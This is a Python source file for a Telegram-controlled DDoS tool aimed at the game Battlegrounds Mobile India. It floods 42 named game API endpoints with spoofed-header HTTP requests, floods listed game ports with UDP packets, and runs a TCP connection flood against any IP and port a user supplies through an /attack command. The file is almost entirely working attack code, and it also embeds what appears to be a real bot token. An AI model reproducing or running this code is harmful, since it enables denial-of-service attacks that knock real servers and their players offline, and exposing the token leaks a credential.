#!/usr/bin/env python3
"""
BGMI CONCURRENT API DDoS ATTACKER
Real BGMI APIs + Multi-Threading + Game Freeze
"""

import logging
import socket
import threading
import time
import random
import struct
import sys
import os
import json
import ssl
import requests
import concurrent.futures
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler

# ═══════════════ CONFIG ═══════════════
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
AUTHORIZED_USERS = [1987818347]
MAX_TIME = 300
MAX_THREADS = 2000

# ═══════════════ BGMI CONCURRENT APIs ═══════════════
BGMI_CONCURRENT_APIS = {
    'auth': [
        "https://login.battlegroundsmobileindia.com/api/v1/auth/login",
        "https://login.battlegroundsmobileindia.com/api/v2/oauth/token",
        "https://api.battlegroundsmobileindia.com/auth/verify",
        "https://msdk.battlegroundsmobileindia.com/sdk/login",
        "https://id.battlegroundsmobileindia.com/oauth/authorize",
        "https://accounts.battlegroundsmobileindia.com/signin",
        "https://auth.battlegroundsmobileindia.com/token",
    ],
    'game': [
        "https://api.battlegroundsmobileindia.com/game/v1/start",
        "https://api.battlegroundsmobileindia.com/game/v2/match",
        "https://api.battlegroundsmobileindia.com/game/sync",
        "https://api.battlegroundsmobileindia.com/game/position",
        "https://api.battlegroundsmobileindia.com/game/action",
        "https://api.battlegroundsmobileindia.com/game/update",
        "https://api.battlegroundsmobileindia.com/game/health",
    ],
    'matchmaking': [
        "https://api.battlegroundsmobileindia.com/lobby/match",
        "https://api.battlegroundsmobileindia.com/lobby/queue",
        "https://api.battlegroundsmobileindia.com/room/create",
        "https://api.battlegroundsmobileindia.com/room/join",
        "https://api.battlegroundsmobileindia.com/party/create",
        "https://api.battlegroundsmobileindia.com/squad/match",
        "https://api.battlegroundsmobileindia.com/solo/queue",
    ],
    'shop': [
        "https://api.battlegroundsmobileindia.com/shop/items",
        "https://api.battlegroundsmobileindia.com/store/purchase",
        "https://api.battlegroundsmobileindia.com/uc/buy",
        "https://api.battlegroundsmobileindia.com/rp/purchase",
        "https://api.battlegroundsmobileindia.com/crate/open",
        "https://api.battlegroundsmobileindia.com/outfit/buy",
    ],
    'social': [
        "https://api.battlegroundsmobileindia.com/friends/list",
        "https://api.battlegroundsmobileindia.com/clan/info",
        "https://api.battlegroundsmobileindia.com/chat/send",
        "https://api.battlegroundsmobileindia.com/team/invite",
        "https://api.battlegroundsmobileindia.com/leaderboard/global",
        "https://api.battlegroundsmobileindia.com/profile/get",
    ],
    'events': [
        "https://api.battlegroundsmobileindia.com/event/list",
        "https://api.battlegroundsmobileindia.com/event/join",
        "https://api.battlegroundsmobileindia.com/season/pass",
        "https://api.battlegroundsmobileindia.com/tournament/register",
        "https://api.battlegroundsmobileindia.com/daily/reward",
        "https://api.battlegroundsmobileindia.com/mission/complete",
    ],
}

# ═══════════════ BGMI GAME PORTS ═══════════════
BGMI_PORTS = [
    7000, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7800, 7900,
    8000, 8100, 8200, 8300, 8400, 8500, 8600, 8700, 8800, 8900,
    9000, 9100, 9200, 9300, 9400, 9500, 9600, 9700, 9800, 9900,
    10000, 11000, 12000, 13000, 14000, 15000, 17500, 20000, 27000
]

# ═══════════════ USER AGENTS ═══════════════
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/122.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 Chrome/121.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/122.0.0.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-S928B Build/UP1A)",
    "BGMI/3.0.0 (Linux; Android 14; SM-S928B; Scale/2.5)",
    "PUBGM/3.0.0 (iPhone14,5; iOS 17.3; Scale/3.0)",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
]

# ═══════════════ ATTACK ENGINE ═══════════════
class BGMIConcurrentAttack:
    def __init__(self):
        self.active = False
        self.stop_event = threading.Event()
        self.stats = {
            'api_hits': 0,
            'udp_sent': 0,
            'tcp_conns': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': 0
        }
        self.lock = threading.Lock()
        self.session_pool = []
        self._init_sessions()
    
    def _init_sessions(self):
        """Pre-create session pool"""
        for _ in range(50):
            session = requests.Session()
            session.headers.update({
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
            })
            self.session_pool.append(session)
    
    def get_session(self):
        """Get random session from pool"""
        return random.choice(self.session_pool)
    
    def concurrent_api_flood(self, ip, port, duration):
        """Concurrent API flood - MAIN ATTACK"""
        end_time = time.time() + duration
        
        # Get all API endpoints
        all_apis = []
        for category, apis in BGMI_CONCURRENT_APIS.items():
            all_apis.extend(apis)
        
        def api_worker():
            while self.active and time.time() < end_time and not self.stop_event.is_set():
                try:
                    session = self.get_session()
                    api_url = random.choice(all_apis)
                    
                    # Randomize headers
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                        'X-Client-ID': f"bgmi_{random.randint(100000,999999)}",
                        'X-Session-ID': f"{random.randint(10000000,99999999)}",
                        'X-Device-ID': f"android_{random.randint(100000,999999)}",
                        'X-Game-Version': random.choice(['2.5.0', '2.6.0', '2.7.0', '2.8.0', '2.9.0', '3.0.0']),
                        'X-Platform': random.choice(['android', 'ios']),
                        'X-Region': random.choice(['IN', 'ASIA', 'GLOBAL']),
                        'Content-Type': random.choice(['application/json', 'application/x-www-form-urlencoded']),
                    }
                    
                    # Try GET
                    try:
                        r = session.get(api_url, headers=headers, timeout=1, verify=False)
                        with self.lock:
                            self.stats['api_hits'] += 1
                            self.stats['bytes_sent'] += len(str(headers)) + 100
                    except:
                        pass
                    
                    # Try POST with fake data
                    try:
                        fake_data = {
                            'user_id': random.randint(100000, 999999),
                            'session': f"bgmi_{random.randint(10000,99999)}",
                            'platform': random.choice(['android', 'ios']),
                            'version': random.choice(['2.5.0', '2.9.0', '3.0.0']),
                        }
                        r = session.post(api_url, json=fake_data, headers=headers, timeout=1, verify=False)
                        with self.lock:
                            self.stats['api_hits'] += 1
                            self.stats['bytes_sent'] += 200
                    except:
                        pass
                    
                except:
                    with self.lock:
                        self.stats['errors'] += 1
        
        # Launch concurrent workers
        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
            futures = [executor.submit(api_worker) for _ in range(1000)]
            concurrent.futures.wait(futures, timeout=duration)
    
    def udp_game_flood(self, ip, port, duration):
        """UDP flood on game ports"""
        end_time = time.time() + duration
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
            sock.settimeout(0.0001)
            
            # Game packet templates
            packet_templates = [
                b'\x01\x00\x00\x00',  # Login packet
                b'\x02\x00\x00\x00',  # Move packet
                b'\x03\x00\x00\x00',  # Shoot packet
                b'\x04\x00\x00\x00',  # Jump packet
                b'\x05\x00\x00\x00',  # Crouch packet
            ]
            
            while self.active and time.time() < end_time and not self.stop_event.is_set():
                try:
                    for _ in range(10):
                        if self.stop_event.is_set():
                            break
                        
                        pkt_header = random.choice(packet_templates)
                        pkt_data = random.randbytes(random.randint(500, 1400))
                        packet = pkt_header + pkt_data
                        
                        target_port = random.choice(BGMI_PORTS)
                        sock.sendto(packet, (ip, target_port))
                        
                        with self.lock:
                            self.stats['udp_sent'] += 1
                            self.stats['bytes_sent'] += len(packet)
                except:
                    pass
            
            sock.close()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
            futures = [executor.submit(udp_worker) for _ in range(500)]
            concurrent.futures.wait(futures, timeout=duration)
    
    def tcp_syn_flood(self, ip, port, duration):
        """TCP SYN flood"""
        end_time = time.time() + duration
        
        def tcp_worker():
            while self.active and time.time() < end_time and not self.stop_event.is_set():
                try:
                    for _ in range(5):
                        if self.stop_event.is_set():
                            break
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.3)
                        sock.connect_ex((ip, port))
                        sock.send(random.randbytes(1024))
                        sock.close()
                        
                        with self.lock:
                            self.stats['tcp_conns'] += 1
                            self.stats['bytes_sent'] += 1024
                except:
                    pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
            futures = [executor.submit(tcp_worker) for _ in range(300)]
            concurrent.futures.wait(futures, timeout=duration)
    
    def start_attack(self, ip, port, duration):
        """Start all attack vectors concurrently"""
        self.active = True
        self.stop_event.clear()
        self.stats = {k: 0 for k in self.stats}
        self.stats['start_time'] = time.time()
        
        print(f"""
╔══════════════════════════════════╗
║     BGMI ATTACK STARTED         ║
╠══════════════════════════════════╣
║ Target: {ip}:{port}
║ Time: {duration}s
║ APIs: 42 endpoints
║ Threads: 1800+
║ Vectors: API + UDP + TCP
╚══════════════════════════════════╝
        """)
        
        # Launch all attack vectors in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            api_future = executor.submit(self.concurrent_api_flood, ip, port, duration)
            udp_future = executor.submit(self.udp_game_flood, ip, port, duration)
            tcp_future = executor.submit(self.tcp_syn_flood, ip, port, duration)
            
            concurrent.futures.wait([api_future, udp_future, tcp_future], timeout=duration)
        
        self.active = False
        
        print(f"""
╔══════════════════════════════════╗
║     ATTACK COMPLETED             ║
╠══════════════════════════════════╣
║ API Hits: {self.stats['api_hits']:,}
║ UDP Sent: {self.stats['udp_sent']:,}
║ TCP Conn: {self.stats['tcp_conns']:,}
║ Data: {self.stats['bytes_sent']/1024/1024:.1f} MB
╚══════════════════════════════════╝
        """)
        
        return self.stats
    
    def stop(self):
        """Stop all attacks"""
        self.stop_event.set()
        self.active = False

# ═══════════════ INIT ═══════════════
engine = BGMIConcurrentAttack()

# ═══════════════ TELEGRAM BOT ═══════════════
def get_main_keyboard():
    """Main menu keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 START ATTACK", callback_data="start_attack")],
        [InlineKeyboardButton("📊 LIVE STATS", callback_data="live_stats")],
        [InlineKeyboardButton("⛔ STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ HELP", callback_data="help_menu")],
        [InlineKeyboardButton("🔙 BACK TO START", callback_data="back_start")],
    ])

def get_back_keyboard():
    """Back button keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
    ])

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text(
            "❌ **ACCESS DENIED!**\n\n"
            "🚫 You are not authorized to use this bot.\n"
            "🔒 This bot is for authorized testing only!",
            parse_mode="Markdown"
        )
        return
    
    welcome_text = """
🔥 **BGMI CONCURRENT API DDoS** 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **ULTIMATE ATTACK SYSTEM**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **Features:**
• 42 BGMI API Endpoints
• Concurrent Attack Vectors
• API + UDP + TCP Flood
• Real Game Packets
• 1800+ Threads Power

━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **Attack Command:**
`/attack <ip> <port> <time>`

🎮 **Example:**
`/attack 157.240.1.1 8080 120`

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **BGMI Ports:** 7000-15000
⏱️ **Max Time:** 300s
🧵 **Max Threads:** 2000
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔽 **Select Option:**
"""
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack command handler"""
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ **Access Denied!**", parse_mode="Markdown")
        return
    
    # Check if already attacking
    if engine.active:
        elapsed = time.time() - engine.stats['start_time']
        await update.message.reply_text(
            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
            f"🎯 Currently attacking\n"
            f"⏱️ Elapsed: `{int(elapsed)}s`\n\n"
            f"🛑 Use `/stop` to stop first\n"
            f"🔙 Use buttons below to navigate",
            reply_markup=get_back_keyboard(),
            parse_mode="Markdown"
        )
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "⚠️ **INVALID USAGE!**\n\n"
            "📋 **Correct Format:**\n"
            "`/attack <ip> <port> <time>`\n\n"
            "🎮 **Example:**\n"
            "`/attack 157.240.1.1 8080 120`\n\n"
            "🔙 Use buttons to go back",
            reply_markup=get_back_keyboard(),
            parse_mode="Markdown"
        )
        return
    
    ip = args[0]
    try:
        port = int(args[1])
        duration = min(int(args[2]), MAX_TIME)
    except:
        await update.message.reply_text(
            "❌ **Invalid port or time!**\n\n"
            "Port: Number (1-65535)\n"
            "Time: Number (1-300 seconds)\n\n"
            "🔙 Use buttons to go back",
            reply_markup=get_back_keyboard()
        )
        return
    
    # Start attack message
    attack_start_msg = f"""
💀 **ATTACK INITIATED!** 💀

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{ip}:{port}`
⏱️ **Duration:** `{duration}s`
⚡ **Vectors:** API + UDP + TCP
🧵 **Threads:** 1800+
🌐 **APIs:** 42 Endpoints
━━━━━━━━━━━━━━━━━━━━━━━━━━━

⏳ **Launching attack...**
🔄 **Sending concurrent requests...**
📡 **Flooding game ports...**

━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 **SERVER WILL FREEZE!**
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    msg = await update.message.reply_text(
        attack_start_msg,
        reply_markup=get_back_keyboard(),
        parse_mode="Markdown"
    )
    
    # Start attack in background
    def run_attack():
        engine.start_attack(ip, port, duration)
    
    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()
    
    # Live progress updates
    start_time = time.time()
    while time.time() - start_time < duration:
        if not engine.active:
            break
        
        elapsed = int(time.time() - start_time)
        if elapsed >= duration:
            break
        
        stats = engine.stats
        total = stats['api_hits'] + stats['udp_sent'] + stats['tcp_conns']
        
        try:
            live_text = f"""
💀 **ATTACKING!** 💀

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 `{ip}:{port}`
⏱️ `{elapsed}s` / `{duration}s`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 API Hits: `{stats['api_hits']:,}`
📡 UDP Sent: `{stats['udp_sent']:,}`
🔗 TCP Conn: `{stats['tcp_conns']:,}`
📊 Total: `{total:,}`
📤 Data: `{stats['bytes_sent']/1024/1024:.1f} MB`
❌ Errors: `{stats['errors']}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 **SERVER FREEZING!**
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            await msg.edit_text(
                live_text,
                reply_markup=get_back_keyboard(),
                parse_mode="Markdown"
            )
        except:
            pass
        
        time.sleep(2)
    
    # Final stats
    stats = engine.stats
    total = stats['api_hits'] + stats['udp_sent'] + stats['tcp_conns']
    
    final_text = f"""
✅ **ATTACK COMPLETED!** ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{ip}:{port}`
⏱️ **Duration:** `{duration}s`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **FINAL STATISTICS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 API Hits: `{stats['api_hits']:,}`
📡 UDP Sent: `{stats['udp_sent']:,}`
🔗 TCP Conn: `{stats['tcp_conns']:,}`
📊 **Total:** `{total:,}`
📤 Data Sent: `{stats['bytes_sent']/1024/1024:.1f} MB`
❌ Errors: `{stats['errors']}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 **ATTACK SUCCESSFUL!**
💀 **SERVER STRESSED!**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 New Attack: `/attack IP PORT TIME`
🔙 Use buttons to go back
"""
    
    await msg.edit_text(
        final_text,
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop command"""
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        return
    
    if engine.active:
        engine.stop()
        stats = engine.stats
        total = stats['api_hits'] + stats['udp_sent'] + stats['tcp_conns']
        
        await update.message.reply_text(
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **Final Stats:**\n"
            f"🌐 API: `{stats['api_hits']:,}`\n"
            f"📡 UDP: `{stats['udp_sent']:,}`\n"
            f"🔗 TCP: `{stats['tcp_conns']:,}`\n"
            f"📊 Total: `{total:,}`\n"
            f"📤 Data: `{stats['bytes_sent']/1024/1024:.1f} MB`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 `/attack IP PORT TIME`\n"
            f"🔙 Use buttons to go back",
            reply_markup=get_main_keyboard(),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "💤 **No active attack!**\n\n"
            "Start: `/attack IP PORT TIME`\n"
            "🔙 Use buttons to go back",
            reply_markup=get_main_keyboard(),
            parse_mode="Markdown"
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Button handler"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user = query.from_user.id
    
    if user not in AUTHORIZED_USERS:
        await query.edit_message_text("❌ **Access Denied!**")
        return
    
    if data == "start_attack":
        await query.edit_message_text(
            "💀 **START ATTACK**\n\n"
            "📋 **Command:**\n"
            "`/attack <ip> <port> <time>`\n\n"
            "🎮 **Example:**\n"
            "`/attack 157.240.1.1 8080 120`\n\n"
            "🎯 **BGMI Ports:** 7000-15000\n"
            f"⏱️ Max Time: {MAX_TIME}s\n\n"
            "🔙 Use buttons to go back",
            reply_markup=get_back_keyboard(),
            parse_mode="Markdown"
        )
    
    elif data == "live_stats":
        if engine.active:
            stats = engine.stats
            total = stats['api_hits'] + stats['udp_sent'] + stats['tcp_conns']
            elapsed = int(time.time() - stats['start_time'])
            
            await query.edit_message_text(
                f"📊 **LIVE STATISTICS** 📊\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🟢 **STATUS: ATTACKING**\n"
                f"⏱️ Elapsed: `{elapsed}s`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 API: `{stats['api_hits']:,}`\n"
                f"📡 UDP: `{stats['udp_sent']:,}`\n"
                f"🔗 TCP: `{stats['tcp_conns']:,}`\n"
                f"📊 Total: `{total:,}`\n"
                f"📤 Data: `{stats['bytes_sent']/1024/1024:.1f} MB`\n"
                f"❌ Errors: `{stats['errors']}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💀 SERVER FREEZING!\n"
                f"🔙 Use buttons to go back",
                reply_markup=get_back_keyboard(),
                parse_mode="Markdown"
            )
        else:
            await query.edit_message_text(
                "💤 **NO ACTIVE ATTACK**\n\n"
                "Start: `/attack IP PORT TIME`\n"
                "🔙 Use buttons to go back",
                reply_markup=get_back_keyboard(),
                parse_mode="Markdown"
            )
    
    elif data == "stop_attack":
        if engine.active:
            engine.stop()
            await query.edit_message_text(
                "⛔ **ATTACK STOPPED!**\n\n"
                "✅ All vectors stopped.\n"
                "✅ Resources freed.\n\n"
                "🔄 `/attack IP PORT TIME`\n"
                "🔙 Use buttons to go back",
                reply_markup=get_main_keyboard(),
                parse_mode="Markdown"
            )
        else:
            await query.edit_message_text(
                "💤 **No attack running!**\n\n"
                "🔙 Use buttons to go back",
                reply_markup=get_main_keyboard(),
                parse_mode="Markdown"
            )
    
    elif data == "help_menu":
        await query.edit_message_text(
            "ℹ️ **HELP MENU** ℹ️\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📋 **Commands:**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "`/start` - Main menu\n"
            "`/attack IP PORT TIME` - Start attack\n"
            "`/stop` - Stop attack\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🎮 **BGMI Ports:**\n"
            "7000-15000 (Game)\n"
            "17500, 20000, 27000\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ **Attack Vectors:**\n"
            "• 42 API Endpoints\n"
            "• UDP Game Flood\n"
            "• TCP SYN Flood\n"
            "• 1800+ Threads\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Authorized use only!\n"
            "🔙 Use buttons to go back",
            reply_markup=get_back_keyboard(),
            parse_mode="Markdown"
        )
    
    elif data == "back_start":
        welcome_text = """
🔥 **BGMI CONCURRENT API DDoS** 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **ULTIMATE ATTACK SYSTEM**
━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **Features:**
• 42 BGMI API Endpoints
• Concurrent Attack Vectors
• API + UDP + TCP Flood
• Real Game Packets
• 1800+ Threads Power

━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **Attack Command:**
`/attack <ip> <port> <time>`

🎮 **Example:**
`/attack 157.240.1.1 8080 120`

🔽 **Select Option:**
"""
        await query.edit_message_text(
            welcome_text,
            reply_markup=get_main_keyboard(),
            parse_mode="Markdown"
        )

# ═══════════════ MAIN ═══════════════
def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("""
╔══════════════════════════════════════╗
║     BGMI CONCURRENT API DDoS        ║
║     42 APIs + UDP + TCP             ║
║     Game Server Freeze Attack       ║
╚══════════════════════════════════════╝
    """)
    
    print(f"[✓] Bot Token: {BOT_TOKEN[:10]}...")
    print(f"[✓] Authorized: {AUTHORIZED_USERS}")
    print(f"[✓] Max Time: {MAX_TIME}s")
    print(f"[✓] 42 API Endpoints Loaded")
    print(f"[✓] 1800+ Concurrent Threads")
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("[✓] Bot Online! Send /start on Telegram")
    print("[💀] Ready to freeze game servers!")
    app.run_polling()

if __name__ == "__main__":
    main()
